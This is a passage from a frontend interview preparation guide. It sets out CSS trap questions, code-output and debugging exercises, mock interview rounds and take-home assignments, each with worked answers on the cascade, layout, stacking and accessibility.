**Answer:** Form participation (no `name`/value submission or validation), mobile native pickers, typeahead, `Escape` handling, label association, autofill, high-contrast mode support and correct screen-reader announcements — unless you rebuild each.

**Why other answers are wrong:** "`role="listbox"` makes it accessible" — roles describe; they implement no behaviour. **Senior answer:** use native `select` (now increasingly stylable via `appearance: base-select` in Chromium) or a vetted combobox implementation following the ARIA Authoring Practices, and test with real assistive tech.

### CSS traps

#### C1 · Specificity: who wins? \[INT\]

```css
#app .list li { color: red; }          /* (1,1,1) */
body div ul li.item.active { color: blue; }  /* (0,2,4) */
:is(#app, .x) li:hover { color: green; } /* (1,1,1) */
```

**Question:** `<li class="item active">` inside `#app .list`, not hovered — what colour?

**Answer:** Red.

**Step by step:** (1) Compare column A first: red (1) and green (1) beat blue (0); the number of classes in blue is irrelevant. (2) Green doesn't match (not hovered). (3) Red wins. When hovered, red and green tie at (1,1,1), so the later rule — green — wins.

**Why other answers are wrong:** "Blue has the most selectors" treats specificity as a count. "Green, because `:is()` is zero" confuses `:is()` with `:where()`.

#### C2 · Layers vs specificity vs order \[ADV\]

```css
@layer base, theme;
@layer theme { .btn { background: purple; } }
@layer base  { #save.btn.primary { background: gray; } }
.btn { background: orange; }
```

**Question:** What colour is `<button id="save" class="btn primary">`?

**Answer:** Orange.

**Step by step:** (1) Layer order beats specificity. (2) Unlayered styles beat every layer. (3) The unlayered `.btn` wins. Without it: purple — `theme` is declared later than `base`, so its weaker selector still wins.

**Why other answers are wrong:** "Gray, the ID" — specificity is only compared within one layer.

#### C3 · `!important` doesn't inherit as important \[INT\]

```css
.card { color: red !important; }
.card p { color: black; }
```

**Question:** What colour is the paragraph text inside `.card`?

**Answer:** Black.

**Step by step:** `!important` competes only among declarations on the same element. The `p` has its own matching declaration, so inheritance never applies.

**Why other answers are wrong:** "Red, `!important` wins everything" — it only wins conflicts for that element.

#### C4 · Form controls don't inherit fonts \[INT\]

```css
body { font: 18px/1.5 Georgia, serif; }
```

**Question:** Do `<button>`, `<input>` and `<select>` use Georgia at 18px?

**Answer:** No; they use the system UI font at about 13.33px.

**Step by step:** the browser stylesheet sets `font` explicitly on form controls, so there is a matching declaration and inheritance doesn't apply.

**Fix:** `button, input, select, textarea { font: inherit; }` — one of the most useful reset lines.

#### C5 · Margin collapse through a parent \[INT\]

```html
<div class="banner" style="background: navy">
  <h1 style="margin-top: 40px">Title</h1>
</div>
```

**Question:** Where does the 40px gap appear?

**Answer:** Above the navy background, not inside it.

**Step by step:** (1) The parent has no border, padding, or BFC. (2) The child's top margin collapses with the parent's (0). (3) The combined 40px margin is applied outside the parent.

**Why other answers are wrong:** "Inside the banner" — that needs padding, a border, or `display: flow-root` on the parent.

**Rendered result:** a white 40px strip above the navy box; the title sits flush at its top.

#### C6 · Percentage padding \[ADV\]

```css
.box { width: 400px; height: 300px; }
.inner { padding-top: 50%; }
```

**Question:** How tall is `.inner`'s top padding?

**Answer:** 200px — 50% of the containing block's **width**, not height.

**Why other answers are wrong:** "150px" assumes vertical percentages use height. This is by spec, so that vertical and horizontal padding stay consistent.

#### C7 · `box-sizing` and `min-width` \[INT\]

```css
.a { box-sizing: border-box; width: 100px; padding: 60px; }
```

**Question:** How wide is it?

**Answer:** 120px.

**Step by step:** border-box gives content width 100 − 120 = negative; content can't be negative, so it clamps to 0 and the box is padding + border = 120px.

#### C8 · Flex items refusing to shrink \[ADV\]

```css
.row { display: flex; width: 300px; }
.row > div { flex: 1; }
/* first div contains: "Supercalifragilisticexpialidocious" */
```

**Question:** Are the items equal width?

**Answer:** No; the first is as wide as the long word, and the row overflows if needed.

**Step by step:** (1) `flex: 1` sets basis 0 and equal grow. (2) But `min-width: auto` forbids shrinking below the min-content width (the unbreakable word). (3) The item is frozen at that width; the others share what's left.

**Fix:** `min-width: 0` plus `overflow-wrap: anywhere` or truncation.

#### C9 · Implicit grid tracks \[ADV\]

```css
.g { display: grid; grid-template-columns: 200px 200px; }
.x { grid-column: 4; }
```

**Question:** Where does `.x` go?

**Answer:** In an implicit 4th column; an implicit 3rd column is also created. Both are sized by `grid-auto-columns` (`auto`), so the empty 3rd column is 0 wide.

**Why other answers are wrong:** "Ignored" or "wraps to the next row" — grid never ignores placement; it grows the grid.

#### C10 · `auto-fit` vs `auto-fill` \[ADV\]

**Question:** `repeat(auto-fill, minmax(150px, 1fr))` vs `auto-fit` in a 900px container with 3 items — what differs?

**Answer:** `auto-fill`: 6 tracks of 150px, 3 empty, items stay 150px. `auto-fit`: empty tracks collapse, items stretch to 300px each. See the Part 8 diagram.

#### C11 · Sticky that never sticks \[ADV\]

```css
.layout { display: flex; overflow-x: hidden; }
.toc { position: sticky; top: 0; }
```

**Question:** Does `.toc` stick while the page scrolls?

**Answer:** No, for two reasons.

**Step by step:** (1) `overflow-x: hidden` makes `.layout` a scroll container, so `.toc` sticks within `.layout`, which never scrolls. (2) As a flex item, `.toc` stretches to the row height, so it has no room to move.

**Fix:** `overflow-x: clip` (not a scroll container) and `align-self: start`.

#### C12 · Negative `z-index` hiding behind the page \[ADV\]

```css
.card { background: white; position: relative; }
.card::before { content: ""; position: absolute; inset: -4px; background: gold; z-index: -1; }
```

**Question:** Is the gold outline visible around the card?

**Answer:** It is painted behind the card's parent backgrounds too, so it may disappear entirely behind an ancestor with a background.

**Step by step:** (1) `.card` has no `z-index`, so it does not form a stacking context. (2) The pseudo-element's `z-index: -1` places it at the bottom of the nearest ancestor stacking context. (3) Any ancestor background inside that context paints above it.

**Fix:** create the stacking context one level up — `isolation: isolate` on the card's parent — so the gold layer sits above the page background but still behind the card. Putting it on `.card` itself would paint the gold over the card's own white background.

#### C13 · `overflow-x: hidden` adds a vertical scrollbar \[ADV\]

```css
.panel { height: 200px; overflow-x: hidden; }
```

**Question:** The content is 400px tall. What happens vertically?

**Answer:** The panel scrolls vertically (a scrollbar appears).

**Step by step:** if one axis is `hidden`/`scroll`/`auto`, the other axis's `visible` computes to `auto`. You cannot clip one axis and let the other overflow visibly — except with `clip`, which pairs with `visible`.

**Fix:** `overflow-x: clip` when you only want to cut off horizontal overflow.

#### C14 · Three ways to hide \[INT\]

```html
<div style="visibility: hidden"><button style="visibility: visible">A</button></div>
<div style="opacity: 0"><button>B</button></div>
<div style="display: none"><button style="display: block">C</button></div>
```

**Question:** Which buttons can be seen, clicked or tabbed to?

**Answer:** A is visible and clickable. B is invisible but still clickable and focusable. C doesn't exist in the layout at all.

**Step by step:** (1) `visibility` is inherited, so a child can override it back to `visible`. (2) `opacity: 0` hides pixels only; hit-testing, focus and screen readers still work. (3) `display: none` removes the whole subtree from the render tree; no child value can bring it back.

**Why other answers are wrong:** "All three hide everything" — only `display: none` hides the subtree unconditionally. See the comparison table in Part 20.

#### C15 · Absolute positioning against the wrong box \[INT\]

```html
<section class="card" style="padding: 20px">
  <div class="body" style="position: relative">
    <span class="badge" style="position: absolute; top: 0; right: 0">New</span>
  </div>
</section>
```

**Question:** Where is the badge — the card's corner or the body's?

**Answer:** The top-right of `.body` (inside the card's padding), because `.body` is the nearest positioned ancestor.

**Fix:** move `position: relative` to `.card`, or drop it from `.body`. Remember the badge is positioned against the **padding box**, not the border box.

#### C16 · `height: 100%` does nothing \[INT\]

```css
.sidebar { height: 100%; }
/* parent: <main> with no height set */
```

**Question:** How tall is `.sidebar`?

**Answer:** Its content height.

**Step by step:** a percentage height resolves only against a **definite** parent height. `main`'s height is `auto` (depends on content), so `100%` computes as `auto`.

**Fixes:** give the chain definite heights (`html, body { height: 100% }`), or better, use the parent's layout: grid/flex items stretch by default (`align-items: stretch`), or `min-height: 100dvh` on the shell.

#### C17 · `100vh` on mobile \[INT\]

**Question:** A `height: 100vh` hero on iPhone: why is the call-to-action button cut off at the bottom?

**Answer:** `100vh` equals the **large** viewport (toolbars hidden). On load the toolbars are showing, so the hero is taller than the visible area.

**Fix:** `min-height: 100svh` (small viewport), with `100vh` as the line before it for very old browsers.

#### C18 · `:is()`, `:where()` and `:not()` specificity \[ADV\]

```css
:where(#nav) a { color: red; }
a:not(#x) { color: blue; }
nav :is(a, #y) { color: green; }
```

**Question:** Specificity of each, and which colour does `<nav id="nav"><a>` get?

**Answer:** (0,0,1), (1,0,1), (1,0,1) → green (ties blue, comes later).

**Step by step:** `:where()` contributes zero; `:not()` and `:is()` take their most specific argument — `#x` and `#y` — even though the element doesn't match those IDs.

**Why other answers are wrong:** "`:not(#x)` is low because the element isn't `#x`" — the argument's specificity counts regardless.

#### C19 · `::before` on an image \[INT\]

```css
img::before { content: "Loading…"; }
input::after { content: "*"; }
```

**Question:** Do these render?

**Answer:** No (with a nuance: some browsers show `::before` on a **broken** image).

**Step by step:** `::before`/`::after` insert boxes **inside** the element's content. Replaced and void elements (`img`, `input`, `br`, `video`) have no content box for them.

**Fix:** put the pseudo-element on a wrapper or the `label`.

#### C20 · A custom property that silently breaks \[ADV\]

```css
:root { --space: 16; }
.card { padding: var(--space)px; color: red; color: var(--brand); }
```

**Question:** What padding and colour does `.card` get (with `--brand` undefined)?

**Answer:** Padding 0; colour is inherited from the parent — **not** red.

**Step by step:** (1) `var(--space)px` produces the tokens `16 px` with a space — invalid, so padding is invalid at computed-value time → initial (0). (2) `color: var(--brand)` parses fine, so it wins the cascade over `red`. (3) At computed-value time it is invalid, so `color` becomes `unset` → inherited. The earlier `red` is already discarded.

**Fixes:** `calc(var(--space) * 1px)`, and fallbacks: `var(--brand, red)`.

#### C21 · Container query that never fires \[ADV\]

```css
.card { container-type: inline-size; }
@container (width > 30rem) { .card { flex-direction: row; } }
```

**Question:** Why doesn't `.card` switch to a row?

**Answer:** An element can't query itself; `@container` matches against the nearest **ancestor** container. `.card`'s styles inside the query look for a container above `.card`.

**Fix:** `container-type` on a wrapper (`.card-wrap`), or style `.card`'s children inside the query.

#### C22 · Overlapping breakpoints \[INT\]

```css
@media (max-width: 768px) { .nav { display: none; } }
@media (min-width: 768px) { .nav-toggle { display: none; } }
```

**Question:** What happens at exactly 768px?

**Answer:** Both match: the nav is hidden **and** the toggle is hidden — no navigation at all.

**Fix:** range syntax with an exclusive bound: `(width < 768px)` and `(width >= 768px)`. Also watch fractional widths (zoom) with the old `767px` / `768px` pattern.

#### C23 · Transform side effects \[ADV\]

```css
.page { transform: translateZ(0); }
.page .toast { position: fixed; bottom: 1rem; right: 1rem; }
span.tag { transform: rotate(-3deg); }
```

**Question:** Where does the toast appear, and does the span rotate?

**Answer:** The toast is fixed to `.page`, not the viewport (it scrolls away with it). The span does not rotate.

**Step by step:** (1) A transformed ancestor becomes the containing block for fixed descendants and creates a stacking context. (2) `transform` doesn't apply to non-replaced **inline** boxes; make the span `inline-block`.

#### C24 · Selector performance myths \[SR\]

**Question:** "Should we ban descendant selectors like `.sidebar a` for performance?"

**Answer:** No. Matching is right-to-left with fast paths and caches; selector cost is negligible for typical stylesheets.

**What actually costs:** huge DOMs, style invalidation from toggling classes high in the tree, layout thrashing, and very broad `:has()` rules. Measure with DevTools Selector Stats before optimising; ban selectors for maintainability (specificity), not speed.

#### C25 · CSS reset vs normalize \[INT\]

**Question:** What's the difference, and which would you use?

**Answer:**

|  | Classic reset (Eric Meyer's) | Normalize.css | Modern reset (e.g. Josh Comeau, Andy Bell) |
| --- | --- | --- | --- |
| Goal | Remove **all** browser defaults | Keep useful defaults, make them **consistent** across browsers | Small opinionated baseline for today's browsers |
| Effect | `h1` looks like body text; lists lose bullets | `h1` keeps its size; fixes old browser bugs | `box-sizing: border-box`, `margin: 0`, media `max-width: 100%`, `font: inherit` on controls, reduced-motion handling |
| Risk | You must restyle everything; removes semantic cues | Much of it fixes browsers nobody supports any more | Opinions may clash with a design system |

```css
/* A modern minimal reset */
*, *::before, *::after { box-sizing: border-box; }
* { margin: 0; }
body { line-height: 1.5; -webkit-font-smoothing: antialiased; }
img, picture, video, canvas, svg { display: block; max-width: 100%; }
input, button, textarea, select { font: inherit; }
p, h1, h2, h3, h4, h5, h6 { overflow-wrap: break-word; }
[hidden] { display: none !important; }
```

**Trap:** `* { margin: 0 }` plus `list-style: none` can make Safari drop list semantics; add `role="list"` where lists are styled bare. Put the reset in the lowest `@layer` so anything can override it.

#### C26 · Logical properties in vertical writing \[ADV\]

```css
.note { writing-mode: vertical-rl; margin-inline-start: 2rem; inline-size: 10rem; }
```

**Question:** Which physical side gets the 2rem margin, and which dimension is 10rem?

**Answer:** The **top** gets the margin; the **height** is 10rem.

**Step by step:** in `vertical-rl`, the inline axis runs top-to-bottom, so inline-start = top and inline-size = height; block flows right to left.

**Why other answers are wrong:** "Left margin, width" assumes horizontal LTR; logical properties follow the writing mode, which is exactly why design systems use them for RTL and CJK vertical text.

### Trap revision summary

- Buttons submit by default; one-field forms submit on Enter.
- `hidden` loses to author `display`; `aria-hidden` doesn't remove focus.
- `srcset` needs `sizes`; lazy images need dimensions.
- Specificity is per-column and per-layer; `:not`/`:is` count their strongest argument.
- Percent padding uses width; percent height needs a definite parent.
- `overflow` other than `visible`/`clip` breaks sticky and forces the other axis to scroll.
- Elements can't container-query themselves; transforms capture fixed children.

## Part 19 — Code Output & Debugging

Output questions test whether you can run the browser in your head; debugging questions test whether you find the root cause before reaching for `!important`. Each output question gives the answer and the reason; each debugging case gives the broken code, root cause, fix, why the fix works, and a more maintainable alternative.

### Output questions

**O1 · Selector matching \[INT\]**

```html
<div class="list"><h3>Title</h3><p>A</p><p>B</p><p>C</p></div>
<style> .list p:nth-child(2) { color: red; } .list p:nth-of-type(2) { font-weight: bold; } </style>
```

**Output:** "A" is red; "B" is bold. `:nth-child(2)` counts all siblings (h3 is 1st, A is 2nd); `:nth-of-type(2)` counts only `p` siblings. Modern alternative: `:nth-child(2 of p)` = B.

**O2 · `currentColor` and inheritance \[INT\]**

```css
.btn { color: white; background: navy; border: 2px solid; }
.btn:hover { color: gold; }
.btn svg { fill: currentColor; }
```

**Output on hover:** text, border **and** icon turn gold. `border` with no colour uses `currentColor`, which tracks `color` on the same element; the SVG inherits `color` and `fill: currentColor` reads it. One property drives three visuals — the basis of icon theming.

**O3 · Box model arithmetic \[INT\]**

```css
.parent { width: 500px; padding: 20px; box-sizing: border-box; }
.child  { width: 50%; padding: 10px; border: 5px solid; margin: 0 auto; }
```

**Output:** the child's content width is 50% of the parent's **content** box: (500 − 40) × 0.5 = 230px; its rendered width is 230 + 20 + 10 = **260px**, centred with 100px auto margins each side.

**O4 · Flex sizing \[ADV\]**

```css
.row { display: flex; width: 800px; gap: 20px; }
.a { flex: 2 1 100px; } .b { flex: 1 1 200px; } .c { flex: 0 0 160px; }
```

**Output:** free space = 800 − 40 gaps − (100 + 200 + 160) = 300px, split 2:1 between `.a` and `.b` (`.c` can't grow) → **a = 300px, b = 300px, c = 160px**.

**O5 · Grid placement \[ADV\]**

```css
.g { display: grid; grid-template-columns: repeat(3, 100px); }
.g > :nth-child(1) { grid-column: 2 / span 2; }
/* 4 children */
```

**Output:** item 1 fills columns 2–3 of row 1; column 1 of row 1 stays **empty** (auto-placement moves forward only); items 2–4 fill row 2. With `grid-auto-flow: dense`, item 2 backfills row 1 column 1.

**O6 · Positioning \[INT\]**

```css
.a { position: relative; top: 20px; }
.b { position: absolute; top: 20px; } /* no positioned ancestor */
```

**Output:** `.a` moves down 20px but its original space stays reserved (siblings don't move). `.b` leaves the flow and is placed 20px from the top of the **initial containing block** (the first viewport-sized box) — it scrolls with the page.

**O7 · Stacking \[ADV\]**

```html
<div style="position:relative; z-index:1; opacity:.99"><div class="tip" style="position:absolute; z-index:100">Tip</div></div>
<div style="position:relative; z-index:2">Header</div>
```

**Output:** the tip renders under the header. The first box forms a stacking context with `z-index: 1` (opacity would also create one), so its child's 100 never competes with the header's 2.

**O8 · Responsive cascade \[INT\]**

```css
@media (width >= 600px) { .box { color: blue; } }
.box { color: red; }
```

**Output at 1000px:** red. Media queries add no specificity; the later rule wins. Put base styles first and queries after.

**O9 · Form validation \[INT\]**

```html
<form><input type="email" value="a@b" required><input type="number" min="1" max="10" step="2" value="4"><button>Go</button></form>
```

**Output on submit:** blocked by the number field (`stepMismatch`: valid values are 1, 3, 5, 7, 9 counting from `min`). `a@b` passes `type="email"`.

**O10 · Transition behaviour \[ADV\]**

```css
.box { transition: transform .3s; }
.box:hover { transform: scale(1.2); transition: transform 1s; }
```

**Output:** scaling up takes 1s; scaling back down takes .3s. The transition used is the one on the element's **destination** state.

**O11 · Overflow and scroll \[INT\]**

```css
.wrap { width: 300px; overflow: hidden; border-radius: 12px; }
.wrap img { width: 400px; }
```

**Output:** the image is clipped to 300px with rounded corners — and the container is still programmatically scrollable (`scrollLeft`, focus moving into hidden content can scroll it). Use `overflow: clip` if it must never scroll.

### Debugging cases

**D1 · Accessibility: an unlabeled custom checkbox \[ADV\]**

```html
<div class="check" onclick="toggle(this)"><span class="box"></span> Remember me</div>
```

**Root cause:** no role, state, focus or keyboard support; screen readers hear plain text.

**Fix:**

```html
<label class="check"><input type="checkbox" name="remember"> Remember me</label>
```

```css
.check input { appearance: none; width: 1.25rem; height: 1.25rem; border: 2px solid #555; border-radius: 4px; display: inline-grid; place-content: center; }
.check input:checked::before { content: ""; width: .6rem; height: .6rem; background: currentColor; clip-path: polygon(14% 44%, 0 65%, 50% 100%, 100% 16%, 80% 0, 43% 62%); }
.check input:focus-visible { outline: 3px solid #2563eb; outline-offset: 2px; }
```

**Why it works:** the native input brings role, checked state, Space-key toggling, form submission and label click; `appearance: none` frees the styling. **Maintainable alternative:** `accent-color: var(--brand)` if the native look is acceptable — one line.

**D2 · Forms: errors that screen readers never hear \[ADV\]**

```html
<input id="email" class="error"><span class="msg">Invalid email</span>
```

**Root cause:** the message is visually adjacent but not programmatically linked; the field has no invalid state; nothing is announced on submit.

**Fix:** `<input id="email" aria-invalid="true" aria-describedby="email-err">` + `<p id="email-err">Enter an email like name@example.com</p>`, and move focus to the first invalid field (or an error summary) on submit.

**Why it works:** focus lands on the field, and the reader announces its name, "invalid entry", and the description. **Alternative:** native validation with `setCustomValidity()` messages — less control over styling, zero ARIA.

**D3 · Animation: janky sidebar \[ADV\]**

```css
.sidebar { width: 0; transition: width .3s; }
.sidebar.open { width: 280px; }
```

**Root cause:** animating `width` re-runs layout for the sidebar and everything beside it every frame; the text inside reflows too.

**Fix:** keep the width constant and animate `transform: translateX(-100%) → none`; let the main area overlay or shift once at the end.

**Why it works:** transform is composited, no layout per frame. **Alternative:** the View Transitions API for a layout change animated as a snapshot, where supported.

**D4 · Overflow: horizontal scroll on mobile \[INT\]**

**Symptom:** the whole page scrolls sideways by \~20px on phones.

**Finding the cause:** in DevTools console run `[...document.querySelectorAll('*')].filter(e => e.scrollWidth > document.documentElement.clientWidth)` or add `* { outline: 1px solid red }` temporarily. Typical culprits: `width: 100vw` (includes the scrollbar on desktop), a fixed-width image or `pre`, negative margins on a full-bleed section, a long URL.

**Fix:** replace `100vw` with `100%`; `img { max-width: 100% }`; `pre { overflow-x: auto }`; `overflow-wrap: anywhere` on user content. **Don't** "fix" with `body { overflow-x: hidden }` — it hides the bug, breaks `position: sticky`, and can cut off focus outlines.

**D5 · Rendering: content jumps when a font loads \[ADV\]**

**Root cause:** the web font has wider glyphs and different line metrics than the fallback; `font-display: swap` re-lays out every text block on swap.

**Fix:** `size-adjust`/`ascent-override` on a local fallback `@font-face` (Part 12), and preload the one font file used above the fold.

**Why it works:** both fonts occupy the same space, so the swap changes pixels, not geometry. **Alternative:** `font-display: optional`.

**D6 · Cascade: a utility class that won't apply \[INT\]**

```css
@layer utilities { .mt-0 { margin-top: 0; } }
.card h2 { margin-top: 2rem; }  /* unlayered */
```

**Root cause:** unlayered styles beat every layer, regardless of specificity.

**Fix:** move component styles into a layer below utilities: `@layer components, utilities;` and wrap `.card h2` in `@layer components`.

**Why it works:** layer order now decides. **Alternative (legacy codebases):** wrap the old unlayered CSS in `@import url(legacy.css) layer(legacy)` so new layered code can win without `!important`.

### Debugging method (say this out loud in interviews)

1. Reproduce and reduce to the smallest snippet.
2. Inspect the element: Computed tab for the winning value, Styles tab for crossed-out losers, box-model panel for sizes.
3. Use the Layout panel overlays for flex/grid, and the Layers/3D view for stacking.
4. Name the root cause in one sentence ("the parent is a scroll container").
5. Fix at the source, verify across engines and at narrow widths, then add a test or lint rule so it can't return.

### Revision summary

- `:nth-child` counts all siblings; `:nth-of-type` counts by tag.
- Percent widths resolve against the parent's content box.
- Flex: distribute free space after bases and gaps.
- Media queries add no specificity; order matters.
- The destination state's `transition` controls each direction.
- Never hide horizontal overflow on `body` to fix a layout bug.

4. (10 min) Performance: the page's CLS is 0.25 and LCP 3.8 s. What do you check first?

**Scoring guide:** reproduces before guessing; uses DevTools vocabulary (computed styles, layout overlays, layers panel); fixes root cause rather than adding `!important` or `z-index: 9999`.

### Mock round 3 — Senior system design (60 min)

**Prompt:** "Design the CSS and HTML architecture for a design system used by 5 teams, 2 brands, light/dark, LTR/RTL."

Expected coverage, in order: clarifying questions (frameworks, legacy apps, browser support, team size) → token tiers and naming → layer order and scoping strategy → layout primitives → component API conventions (variants as data attributes, theming hooks) → accessibility guarantees and testing → distribution and versioning → governance and contribution → metrics.

**Follow-ups to expect:** How do you ship a breaking change? How do you stop teams overriding internals? Runtime CSS-in-JS — yes or no, and why? How do you handle a third-party widget with conflicting CSS?

### Mock round 4 — Behavioural for senior frontend roles (30 min)

- Tell me about a time you pushed back on a design for accessibility or performance reasons.
- Describe a large CSS refactor you led. How did you avoid regressions?
- How do you review a junior engineer's CSS?
- A launch is tomorrow and the layout breaks in Safari. Walk me through your next two hours.

Use STAR (situation, task, action, result) and include a number in the result (bundle size cut, CLS fixed, defects reduced).

### Take-home assignments

**Take-home A — Accessible product page (4–6 hours).** Build a product detail page: image gallery with thumbnails, size selector (radio group), quantity input, add-to-cart button with confirmation toast, tabs for description and reviews, related-products grid. No frameworks required.

Graded on: semantics and accessible names, keyboard support, responsive from 320px, image performance (`srcset`, dimensions, priority), CSS organisation (tokens, layers), no layout shift, README with trade-offs and what you'd do next.

**Take-home B — Themeable component kit (6–8 hours).** Build Button, Input, Select, Checkbox, Card, Dialog and Tabs with: design tokens, light/dark and one alternate brand, RTL support, a demo page, and visual states (hover, focus, disabled, error, loading).

Graded on: token architecture, specificity discipline, `forced-colors` support, reduced motion, documented component API.

**Take-home C — Legacy refactor (4 hours).** Given a 2,000-line stylesheet with floats, IDs, `!important` and duplicated colours, migrate one page to Grid/Flex with tokens and layers, without visual change. Graded on: safety (before/after screenshots), measurable improvement, and a written migration plan for the rest.

**Take-home tips:** respect the time box and say what you'd add; write the README as if for a reviewer with 10 minutes; include a short accessibility statement listing what you tested (keyboard, VoiceOver/NVDA, zoom, axe).

### Common interview mistakes (final reminder)

- Jumping into code before describing structure and semantics.
- Pixel media queries for every component instead of intrinsic layouts.
- "`z-index` is broken" instead of naming the stacking context.
- Removing focus outlines; ignoring keyboard users.
- Treating ARIA as a fix rather than a description.
- Stating browser support from memory as fact — say "I'd confirm on Baseline/caniuse".
- Giving one solution with no trade-offs at senior level.
